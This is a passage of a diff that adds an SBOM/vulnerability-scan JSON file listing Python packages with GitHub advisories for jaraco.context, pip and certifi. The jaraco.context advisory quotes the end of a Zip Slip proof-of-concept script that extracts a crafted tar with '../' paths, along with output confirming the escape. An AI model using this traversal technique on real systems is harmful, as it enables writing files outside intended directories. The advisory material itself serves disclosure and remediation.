DEFAULT_FILTER\n    if hasattr(tarfile, 'DEFAULT_FILTER'):\n        print(\\\"[+] Python has DEFAULT_FILTER (tarfile security hardening)\\\")\n    else:\n        print(\\\"[!] Python does not have DEFAULT_FILTER (older version)\\\")\n    print()\n\n\nif __name__ == \\\"__main__\\\":\n    check_python_version()\n    exploit_zipslip()\n```\n\nOutput:\n```\n[+] Python version: 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC 12.2.0] \n[!] Python does not have DEFAULT_FILTER (older version) \n\n[*] Target: setuptools._vendor.jaraco.context.tarball() \n[+] Created target extraction directory: /tmp/zipslip_test_tnu3qpd5/extraction_target \n[*] Creating malicious tar archive... \n[*] Extracting: ../../tmp/pwned_by_zipslip.txt           -> ../../tmp/pwned_by_zipslip.txt \n    ✓ Extracted successfully \n[*] Extracting: ../../../../home/pwned_home.txt          -> ../../../../home/pwned_home.txt \n    ! PermissionError: Path traversal ATTEMPTED \n[*] Extracting: ../escaped.txt                           -> ../escaped.txt \n    ✓ Extracted successfully \n[*] Extracting: legitimate_file.txt                      -> legitimate_file.txt \n    ✓ Extracted successfully \n[*] Checking for extracted files... \n[*] Files in target directory (/tmp/zipslip_test_tnu3qpd5/extraction_target): \nextraction_target/ \n  legitimate_file.txt \n    └─ This file stays in target directory... \n\n[*] Checking for traversal attempts... \n\n[-] OK: Escape to /tmp - No escape detected \n[-] OK: Escape to home - No escape detected \n[+] Path Traversal Confirmed: Escape to parent \n      File created at: /tmp/zipslip_test_tnu3qpd5/escaped.txt \n      Content: [ZIPSLIP] File in parent directory! \n      Removing: /tmp/zipslip_test_tnu3qpd5/escaped.txt \n[+] EXPLOIT SUCCESSFUL - Path traversal vulnerability confirmed! \n\n[*] Cleaning up: /tmp/zipslip_test_tnu3qpd5\n```\n\n### Impact\n\n- Arbitrary file creation in filesystem (HIGH exploitability) - especially if popular packages download tar files remotely and use this package to extract files.\n- Privesc (LOW exploitability)\n- Supply-Chain attack (VARIABLE exploitability) - relevant to the first point.\n\n### Remediation\n\nI guess removing the custom filter is not feasible given the backward compatibility issues that might come up you can use a safer filter `strip_first_component` that skips or sanitizes `../` character sequences since it is already there eg.\n```\nif member.name.startswith('/') or '..' in member.name:\n  raise ValueError(f\\\"Attempted path traversal detected: {member.name}\\\")\n```",
+          "aliases": [
+            "CVE-2026-23949"
+          ],
+          "modified": "2026-02-05T12:43:46.476778Z",
+          "published": "2026-01-13T21:48:17Z",
+          "related": [
+            "CGA-qx7r-jp99-r86h"
+          ],
+          "database_specific": {
+            "severity": "HIGH",
+            "cwe_ids": [
+              "CWE-22"
+            ],
+            "nvd_published_at": "2026-01-20T01:15:57Z",
+            "github_reviewed": true,
+            "github_reviewed_at": "2026-01-13T21:48:17Z"
+          },
+          "references": [
+            {
+              "type": "WEB",
+              "url": "https://github.com/jaraco/jaraco.context/security/advisories/GHSA-58pv-8j8x-9vj2"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-23949"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/jaraco/jaraco.context/commit/7b26a42b525735e4085d2e994e13802ea339d5f9"
+            },
+            {
+              "type": "PACKAGE",
+              "url": "https://github.com/jaraco/jaraco.context"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/jaraco/jaraco.context/blob/main/jaraco/context/__init__.py#L74-L91"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/pypa/setuptools/blob/main/setuptools/_vendor/jaraco/context.py#L55-L76"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "jaraco-context",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/jaraco-context"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "5.2.0"
+                    },
+                    {
+                      "fixed": "6.1.0"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "5.2.0",
+                "5.3.0",
+                "6.0.0",
+                "6.0.1",
+                "6.0.2"
+              ],
+              "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-58pv-8j8x-9vj2/GHSA-58pv-8j8x-9vj2.json"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V3",
+              "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N"
+            }
+          ]
+        }
+      ],
+      "vulnerability_count": 1,
+      "has_vulnerabilities": true,
+      "query_time": "2026-03-05T18:11:28.681355"
+    },
+    {
+      "name": "jaraco.collections",
+      "version": "5.1.0",
+      "purl": "pkg:pypi/jaraco.collections@5.1.0",
+      "type": "library",
+      "bom-ref": "pkg:pypi/jaraco.collections@5.1.0",
+      "group": "",
+      "description": "Collection objects similar to those in stdlib by jaraco",
+      "licenses": [],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 0.5,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/jaraco.collections-5.1.0.dist-info/METADATA"
+              }
+            ],
+            "concludedValue": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/jaraco.collections-5.1.0.dist-info/METADATA"
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "cdx:python:requires_python",
+          "value": ">=3.8"
+        }
+      ],
+      "vulnerabilities": [],
+      "vulnerability_count": 0,
+      "has_vulnerabilities": false,
+      "query_time": "2026-03-05T18:11:28.681361"
+    },
+    {
+      "name": "inflect",
+      "version": "7.3.1",
+      "purl": "pkg:pypi/inflect@7.3.1",
+      "type": "library",
+      "bom-ref": "pkg:pypi/inflect@7.3.1",
+      "group": "",
+      "description": "Correctly generate plurals, singular nouns, ordinals, indefinite articles",
+      "licenses": [],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 0.5,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/inflect-7.3.1.dist-info/METADATA"
+              }
+            ],
+            "concludedValue": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/inflect-7.3.1.dist-info/METADATA"
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "cdx:python:requires_python",
+          "value": ">=3.8"
+        }
+      ],
+      "vulnerabilities": [],
+      "vulnerability_count": 0,
+      "has_vulnerabilities": false,
+      "query_time": "2026-03-05T18:11:28.681367"
+    },
+    {
+      "name": "importlib_metadata",
+      "version": "8.0.0",
+      "purl": "pkg:pypi/importlib-metadata@8.0.0",
+      "type": "library",
+      "bom-ref": "pkg:pypi/importlib-metadata@8.0.0",
+      "group": "",
+      "description": "Read metadata from Python packages",
+      "licenses": [],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 0.5,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/importlib_metadata-8.0.0.dist-info/METADATA"
+              }
+            ],
+            "concludedValue": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/importlib_metadata-8.0.0.dist-info/METADATA"
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "cdx:python:requires_python",
+          "value": ">=3.8"
+        }
+      ],
+      "vulnerabilities": [],
+      "vulnerability_count": 0,
+      "has_vulnerabilities": false,
+      "query_time": "2026-03-05T18:11:28.681438"
+    },
+    {
+      "name": "backports.tarfile",
+      "version": "1.2.0",
+      "purl": "pkg:pypi/backports.tarfile@1.2.0",
+      "type": "library",
+      "bom-ref": "pkg:pypi/backports.tarfile@1.2.0",
+      "group": "",
+      "description": "Backport of CPython tarfile module",
+      "licenses": [],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 0.5,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/backports.tarfile-1.2.0.dist-info/METADATA"
+              }
+            ],
+            "concludedValue": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/backports.tarfile-1.2.0.dist-info/METADATA"
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "cdx:python:requires_python",
+          "value": ">=3.8"
+        }
+      ],
+      "vulnerabilities": [],
+      "vulnerability_count": 0,
+      "has_vulnerabilities": false,
+      "query_time": "2026-03-05T18:11:28.681461"
+    },
+    {
+      "name": "autocommand",
+      "version": "2.2.2",
+      "purl": "pkg:pypi/autocommand@2.2.2",
+      "type": "library",
+      "bom-ref": "pkg:pypi/autocommand@2.2.2",
+      "group": "",
+      "description": "A library to create a command-line program from a function",
+      "licenses": [
+        {
+          "license": {
+            "name": "LGPLv3"
+          }
+        }
+      ],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 0.5,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/autocommand-2.2.2.dist-info/METADATA"
+              }
+            ],
+            "concludedValue": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/setuptools/_vendor/autocommand-2.2.2.dist-info/METADATA"
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "cdx:python:requires_python",
+          "value": ">=3.7"
+        }
+      ],
+      "vulnerabilities": [],
+      "vulnerability_count": 0,
+      "has_vulnerabilities": false,
+      "query_time": "2026-03-05T18:11:28.681468"
+    },
+    {
+      "name": "pip",
+      "version": "24.0",
+      "purl": "pkg:pypi/pip@24.0",
+      "type": "library",
+      "bom-ref": "pkg:pypi/pip@24.0",
+      "group": "",
+      "description": "The PyPA recommended tool for installing Python packages.",
+      "licenses": [
+        {
+          "license": {
+            "name": "MIT"
+          }
+        }
+      ],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 0.5,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/pip-24.0.dist-info/METADATA"
+              }
+            ],
+            "concludedValue": "data/repos/public-apis_public-apis/.venv/lib/python3.11/site-packages/pip-24.0.dist-info/METADATA"
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "cdx:python:requires_python",
+          "value": ">=3.7"
+        }
+      ],
+      "vulnerabilities": [
+        {
+          "id": "GHSA-4xh5-x5gv-qwph",
+          "summary": "pip's fallback tar extraction doesn't check symbolic links point to extraction directory",
+          "details": "When extracting a tar archive pip may not check symbolic links point into the extraction directory if the tarfile module doesn't implement PEP 706. Note that upgrading pip to a \"fixed\" version for this vulnerability doesn't fix all known vulnerabilities that are remediated by using a Python version that implements PEP 706. Note that this is a vulnerability in pip's fallback implementation of tar extraction for Python versions that don't implement PEP 706 and therefore are not secure to all vulnerabilities in the Python 'tarfile' module. If you're using a Python version that implements PEP 706 then pip doesn't use the \"vulnerable\" fallback code. Mitigations include upgrading to a version of pip that includes the fix, upgrading to a Python version that implements PEP 706 (Python >=3.9.17, >=3.10.12, >=3.11.4, or >=3.12), applying the linked patch, or inspecting source distributions (sdists) before installation as is already a best-practice.",
+          "aliases": [
+            "BIT-pip-2025-8869",
+            "CVE-2025-8869"
+          ],
+          "modified": "2026-02-04T03:47:34.542520Z",
+          "published": "2025-09-24T15:31:14Z",
+          "related": [
+            "CGA-39qr-jmx6-xj3f"
+          ],
+          "database_specific": {
+            "github_reviewed": true,
+            "severity": "MODERATE",
+            "nvd_published_at": "2025-09-24T15:15:41Z",
+            "github_reviewed_at": "2025-09-24T20:04:58Z",
+            "cwe_ids": [
+              "CWE-59"
+            ]
+          },
+          "references": [
+            {
+              "type": "ADVISORY",
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-8869"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/pypa/pip/pull/13550"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/pypa/pip/commit/f2b92314da012b9fffa36b3f3e67748a37ef464a"
+            },
+            {
+              "type": "PACKAGE",
+              "url": "https://github.com/pypa/pip"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.debian.org/debian-lts-announce/2025/10/msg00028.html"
+            },
+            {
+              "type": "WEB",
+              "url": "https://mail.python.org/archives/list/security-announce@python.org/thread/IF5A3GCJY3VH7BVHJKOWOJFKTW7VFQEN"
+            },
+            {
+              "type": "WEB",
+              "url": "https://pip.pypa.io/en/stable/news/#v25-2"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "pip",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/pip"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "0"
+                    },
+                    {
+                      "fixed": "25.3"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "0.2",
+                "0.2.1",
+                "0.3",
+                "0.3.1",
+                "0.4",
+                "0.5",
+                "0.5.1",
+                "0.6",
+                "0.6.1",
+                "0.6.2",
+                "0.6.3",
+                "0.7",
+                "0.7.1",
+                "0.7.2",
+                "0.8",
+                "0.8.1",
+                "0.8.2",
+                "0.8.3",
+                "1.0",
+                "1.0.1",
+                "1.0.2",
+                "1.1",
+                "1.2",
+                "1.2.1",
+                "1.3",
+                "1.3.1",
+                "1.4",
+                "1.4.1",
+                "1.5",
+                "1.5.1",
+                "1.5.2",
+                "1.5.3",
+                "1.5.4",
+                "1.5.5",
+                "1.5.6",
+                "10.0.0",
+                "10.0.0b1",
+                "10.0.0b2",
+                "10.0.1",
+                "18.0",
+                "18.1",
+                "19.0",
+                "19.0.1",
+                "19.0.2",
+                "19.0.3",
+                "19.1",
+                "19.1.1",
+                "19.2",
+                "19.2.1",
+                "19.2.2",
+                "19.2.3",
+                "19.3",
+                "19.3.1",
+                "20.0",
+                "20.0.1",
+                "20.0.2",
+                "20.1",
+                "20.1.1",
+                "20.1b1",
+                "20.2",
+                "20.2.1",
+                "20.2.2",
+                "20.2.3",
+                "20.2.4",
+                "20.2b1",
+                "20.3",
+                "20.3.1",
+                "20.3.2",
+                "20.3.3",
+                "20.3.4",
+                "20.3b1",
+                "21.0",
+                "21.0.1",
+                "21.1",
+                "21.1.1",
+                "21.1.2",
+                "21.1.3",
+                "21.2",
+                "21.2.1",
+                "21.2.2",
+                "21.2.3",
+                "21.2.4",
+                "21.3",
+                "21.3.1",
+                "22.0",
+                "22.0.1",
+                "22.0.2",
+                "22.0.3",
+                "22.0.4",
+                "22.1",
+                "22.1.1",
+                "22.1.2",
+                "22.1b1",
+                "22.2",
+                "22.2.1",
+                "22.2.2",
+                "22.3",
+                "22.3.1",
+                "23.0",
+                "23.0.1",
+                "23.1",
+                "23.1.1",
+                "23.1.2",
+                "23.2",
+                "23.2.1",
+                "23.3",
+                "23.3.1",
+                "23.3.2",
+                "24.0",
+                "24.1",
+                "24.1.1",
+                "24.1.2",
+                "24.1b1",
+                "24.1b2",
+                "24.2",
+                "24.3",
+                "24.3.1",
+                "25.0",
+                "25.0.1",
+                "25.1",
+                "25.1.1",
+                "25.2",
+                "6.0",
+                "6.0.1",
+                "6.0.2",
+                "6.0.3",
+                "6.0.4",
+                "6.0.5",
+                "6.0.6",
+                "6.0.7",
+                "6.0.8",
+                "6.1.0",
+                "6.1.1",
+                "7.0.0",
+                "7.0.1",
+                "7.0.2",
+                "7.0.3",
+                "7.1.0",
+                "7.1.1",
+                "7.1.2",
+                "8.0.0",
+                "8.0.1",
+                "8.0.2",
+                "8.0.3",
+                "8.1.0",
+                "8.1.1",
+                "8.1.2",
+                "9.0.0",
+                "9.0.1",
+                "9.0.2",
+                "9.0.3"
+              ],
+              "database_specific": {
+                "last_known_affected_version_range": "<= 25.2",
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-4xh5-x5gv-qwph/GHSA-4xh5-x5gv-qwph.json"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V4",
+              "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"
+            }
+          ]
+        },
+        {
+          "id": "GHSA-6vgw-5pg2-w6jp",
+          "summary": "pip Path Traversal vulnerability",
+          "details": "When pip is installing and extracting a maliciously crafted wheel archive, files may be extracted outside the installation directory. The path traversal is limited to prefixes of the installation directory, thus isn't able to inject or overwrite executable files in typical situations.",
+          "aliases": [
+            "BIT-pip-2026-1703",
+            "CVE-2026-1703"
+          ],
+          "modified": "2026-02-16T17:11:10.097207Z",
+          "published": "2026-02-02T15:30:34Z",
+          "related": [
+            "CGA-j3wx-hhh2-pqmx"
+          ],
+          "database_specific": {
+            "github_reviewed_at": "2026-02-02T22:08:51Z",
+            "severity": "LOW",
+            "nvd_published_at": "2026-02-02T15:16:30Z",
+            "cwe_ids": [
+              "CWE-22"
+            ],
+            "github_reviewed": true
+          },
+          "references": [
+            {
+              "type": "ADVISORY",
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-1703"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/pypa/pip/pull/13777"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/pypa/pip/commit/8e227a9be4faa9594e05d02ca05a413a2a4e7735"
+            },
+            {
+              "type": "PACKAGE",
+              "url": "https://github.com/pypa/pip"
+            },
+            {
+              "type": "WEB",
+              "url": "https://mail.python.org/archives/list/security-announce@python.org/thread/WIEA34D4TABF2UNQJAOMXKCICSPBE2DJ"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "pip",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/pip"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "0"
+                    },
+                    {
+                      "fixed": "26.0"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "0.2",
+                "0.2.1",
+                "0.3",
+                "0.3.1",
+                "0.4",
+                "0.5",
+                "0.5.1",
+                "0.6",
+                "0.6.1",
+                "0.6.2",
+                "0.6.3",
+                "0.7",
+                "0.7.1",
+                "0.7.2",
+                "0.8",
+                "0.8.1",
+                "0.8.2",
+                "0.8.3",
+                "1.0",
+                "1.0.1",
+                "1.0.2",
+                "1.1",
+                "1.2",
+                "1.2.1",
+                "1.3",
+                "1.3.1",
+                "1.4",
+                "1.4.1",
+                "1.5",
+                "1.5.1",
+                "1.5.2",
+                "1.5.3",
+                "1.5.4",
+                "1.5.5",
+                "1.5.6",
+                "10.0.0",
+                "10.0.0b1",
+                "10.0.0b2",
+                "10.0.1",
+                "18.0",
+                "18.1",
+                "19.0",
+                "19.0.1",
+                "19.0.2",
+                "19.0.3",
+                "19.1",
+                "19.1.1",
+                "19.2",
+                "19.2.1",
+                "19.2.2",
+                "19.2.3",
+                "19.3",
+                "19.3.1",
+                "20.0",
+                "20.0.1",
+                "20.0.2",
+                "20.1",
+                "20.1.1",
+                "20.1b1",
+                "20.2",
+                "20.2.1",
+                "20.2.2",
+                "20.2.3",
+                "20.2.4",
+                "20.2b1",
+                "20.3",
+                "20.3.1",
+                "20.3.2",
+                "20.3.3",
+                "20.3.4",
+                "20.3b1",
+                "21.0",
+                "21.0.1",
+                "21.1",
+                "21.1.1",
+                "21.1.2",
+                "21.1.3",
+                "21.2",
+                "21.2.1",
+                "21.2.2",
+                "21.2.3",
+                "21.2.4",
+                "21.3",
+                "21.3.1",
+                "22.0",
+                "22.0.1",
+                "22.0.2",
+                "22.0.3",
+                "22.0.4",
+                "22.1",
+                "22.1.1",
+                "22.1.2",
+                "22.1b1",
+                "22.2",
+                "22.2.1",
+                "22.2.2",
+                "22.3",
+                "22.3.1",
+                "23.0",
+                "23.0.1",
+                "23.1",
+                "23.1.1",
+                "23.1.2",
+                "23.2",
+                "23.2.1",
+                "23.3",
+                "23.3.1",
+                "23.3.2",
+                "24.0",
+                "24.1",
+                "24.1.1",
+                "24.1.2",
+                "24.1b1",
+                "24.1b2",
+                "24.2",
+                "24.3",
+                "24.3.1",
+                "25.0",
+                "25.0.1",
+                "25.1",
+                "25.1.1",
+                "25.2",
+                "25.3",
+                "6.0",
+                "6.0.1",
+                "6.0.2",
+                "6.0.3",
+                "6.0.4",
+                "6.0.5",
+                "6.0.6",
+                "6.0.7",
+                "6.0.8",
+                "6.1.0",
+                "6.1.1",
+                "7.0.0",
+                "7.0.1",
+                "7.0.2",
+                "7.0.3",
+                "7.1.0",
+                "7.1.1",
+                "7.1.2",
+                "8.0.0",
+                "8.0.1",
+                "8.0.2",
+                "8.0.3",
+                "8.1.0",
+                "8.1.1",
+                "8.1.2",
+                "9.0.0",
+                "9.0.1",
+                "9.0.2",
+                "9.0.3"
+              ],
+              "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-6vgw-5pg2-w6jp/GHSA-6vgw-5pg2-w6jp.json"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V4",
+              "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:A/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+            }
+          ]
+        }
+      ],
+      "vulnerability_count": 2,
+      "has_vulnerabilities": true,
+      "query_time": "2026-03-05T18:11:28.681482"
+    },
+    {
+      "name": "certifi",
+      "version": "2021.10.8",
+      "purl": "pkg:pypi/certifi@2021.10.8",
+      "type": "library",
+      "bom-ref": "pkg:pypi/certifi@2021.10.8",
+      "group": "",
+      "description": "Python package for providing Mozilla's CA Bundle.",
+      "licenses": [
+        {
+          "license": {
+            "id": "MPL-2.0",
+            "url": "https://opensource.org/licenses/MPL-2.0"
+          }
+        }
+      ],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 1,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/scripts/requirements.txt"
+              },
+              {
+                "technique": "instrumentation",
+                "confidence": 1,
+                "value": "cdxgen-venv-3Xn6F4"
+              }
+            ]
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "SrcFile",
+          "value": "data/repos/public-apis_public-apis/scripts/requirements.txt"
+        }
+      ],
+      "vulnerabilities": [
+        {
+          "id": "GHSA-248v-346w-9cwc",
+          "summary": "Certifi removes GLOBALTRUST root certificate",
+          "details": "Certifi 2024.07.04 removes root certificates from \"GLOBALTRUST\" from the root store. These are in the process of being removed from Mozilla's trust store.\n\nGLOBALTRUST's root certificates are being removed pursuant to an investigation which identified \"long-running and unresolved compliance issues\". Conclusions of Mozilla's investigation can be found [here]( https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/XpknYMPO8dI).",
+          "aliases": [
+            "CVE-2024-39689",
+            "PYSEC-2024-230"
+          ],
+          "modified": "2026-02-04T02:57:32.108133Z",
+          "published": "2024-07-05T20:06:40Z",
+          "related": [
+            "CGA-fj4m-68jh-2rrm",
+            "PYSEC-2024-230"
+          ],
+          "database_specific": {
+            "cwe_ids": [
+              "CWE-345"
+            ],
+            "nvd_published_at": "2024-07-05T19:15:10Z",
+            "severity": "LOW",
+            "github_reviewed_at": "2024-07-05T20:06:40Z",
+            "github_reviewed": true
+          },
+          "references": [
+            {
+              "type": "WEB",
+              "url": "https://github.com/certifi/python-certifi/security/advisories/GHSA-248v-346w-9cwc"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-39689"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/certifi/python-certifi/commit/bd8153872e9c6fc98f4023df9c2deaffea2fa463"
+            },
+            {
+              "type": "PACKAGE",
+              "url": "https://github.com/certifi/python-certifi"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/pypa/advisory-database/tree/main/vulns/certifi/PYSEC-2024-230.yaml"
+            },
+            {
+              "type": "WEB",
+              "url": "https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/XpknYMPO8dI"
+            },
+            {
+              "type": "WEB",
+              "url": "https://security.netapp.com/advisory/ntap-20241206-0001"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "certifi",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/certifi"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "2021.5.30"
+                    },
+                    {
+                      "fixed": "2024.7.4"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "2021.10.8",
+                "2021.5.30",
+                "2022.12.7",
+                "2022.5.18",
+                "2022.5.18.1",
+                "2022.6.15",
+                "2022.6.15.1",
+                "2022.6.15.2",
+                "2022.9.14",
+                "2022.9.24",
+                "2023.11.17",
+                "2023.5.7",
+                "2023.7.22",
+                "2024.2.2",
+                "2024.6.2"
+              ],
+              "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/07/GHSA-248v-346w-9cwc/GHSA-248v-346w-9cwc.json"
+              }
+            }
+          ],
+          "schema_version": "1.7.3"
+        },
+        {
+          "id": "GHSA-43fp-rhv2-5gv8",
+          "summary": "Certifi removing TrustCor root certificate",
+          "details": "Certifi 2022.12.07 removes root certificates from \"TrustCor\" from the root store. These are in the process of being removed from Mozilla's trust store.\n\nTrustCor's root certificates are being removed pursuant to an investigation prompted by media reporting that TrustCor's ownership also operated a business that produced spyware. Conclusions of Mozilla's investigation can be found [here](https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/oxX69KFvsm4/m/yLohoVqtCgAJ).",
+          "aliases": [
+            "CVE-2022-23491",
+            "PYSEC-2022-42986"
+          ],
+          "modified": "2025-02-12T18:53:14.421067Z",
+          "published": "2022-12-07T23:05:18Z",
+          "database_specific": {
+            "github_reviewed_at": "2022-12-07T23:05:18Z",
+            "github_reviewed": true,
+            "cwe_ids": [
+              "CWE-345"
+            ],
+            "nvd_published_at": "2022-12-07T22:15:00Z",
+            "severity": "MODERATE"
+          },
+          "references": [
+            {
+              "type": "WEB",
+              "url": "https://github.com/certifi/python-certifi/security/advisories/GHSA-43fp-rhv2-5gv8"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23491"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/certifi/python-certifi/commit/9e9e840925d7b8e76c76fdac1fab7e6e88c1c3b8"
+            },
+            {
+              "type": "PACKAGE",
+              "url": "https://github.com/certifi/python-certifi"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/pypa/advisory-database/tree/main/vulns/certifi/PYSEC-2022-42986.yaml"
+            },
+            {
+              "type": "WEB",
+              "url": "https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/oxX69KFvsm4/m/yLohoVqtCgAJ"
+            },
+            {
+              "type": "WEB",
+              "url": "https://security.netapp.com/advisory/ntap-20230223-0010"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "certifi",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/certifi"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "2017.11.05"
+                    },
+                    {
+                      "fixed": "2022.12.07"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "2017.11.5",
+                "2018.1.18",
+                "2018.10.15",
+                "2018.11.29",
+                "2018.4.16",
+                "2018.8.13",
+                "2018.8.24",
+                "2019.11.28",
+                "2019.3.9",
+                "2019.6.16",
+                "2019.9.11",
+                "2020.11.8",
+                "2020.12.5",
+                "2020.4.5",
+                "2020.4.5.1",
+                "2020.4.5.2",
+                "2020.6.20",
+                "2021.10.8",
+                "2021.5.30",
+                "2022.5.18",
+                "2022.5.18.1",
+                "2022.6.15",
+                "2022.6.15.1",
+                "2022.6.15.2",
+                "2022.9.14",
+                "2022.9.24"
+              ],
+              "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/12/GHSA-43fp-rhv2-5gv8/GHSA-43fp-rhv2-5gv8.json"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V3",
+              "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:N/I:H/A:N"
+            },
+            {
+              "type": "CVSS_V4",
+              "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:H/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"
+            }
+          ]
+        },
+        {
+          "id": "GHSA-xqr8-7jwr-rhp7",
+          "summary": "Removal of e-Tugra root certificate",
+          "details": "Certifi 2023.07.22 removes root certificates from \"e-Tugra\" from the root store. These are in the process of being removed from Mozilla's trust store.\n\n e-Tugra's root certificates are being removed pursuant to an investigation prompted by reporting of security issues in their systems. Conclusions of Mozilla's investigation can be found [here](https://groups.google.com/a/mozilla.org/g/dev-security-policy/c/C-HrP1SEq1A).",
+          "aliases": [
+            "CVE-2023-37920",
+            "PYSEC-2023-135"
+          ],
